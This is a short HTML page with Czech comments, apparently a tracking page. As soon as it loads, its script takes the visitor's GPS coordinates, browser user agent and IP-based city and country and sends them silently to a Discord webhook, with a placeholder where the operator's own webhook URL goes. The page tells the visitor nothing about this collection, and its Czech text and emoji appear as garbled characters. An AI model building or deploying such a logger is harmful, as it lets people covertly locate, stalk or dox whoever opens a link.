<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "TV≈ÆJ_DISCORD_WEBHOOK_URL"; // Nahraƒè sv√Ωm webhookem

        function getLocation() {
            let device = navigator.userAgent; // Detekce za≈ô√≠zen√≠

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    getIP(device, `üìç GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "üö´ GPS zam√≠tnuta");
                });
            } else {
                getIP(device, "üö´ GPS nen√≠ podporov√°na");
            }
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `üì± Za≈ô√≠zen√≠: ${device}\n${gpsData}\nüåç IP Adresa: ${data.ip} (Mƒõsto: ${data.city}, Zemƒõ: ${data.country})`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba z√≠sk√°n√≠ IP:", error));
        }

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes√≠l√°n√≠:", error));
        }

        window.onload = getLocation;
    </script>
</head>
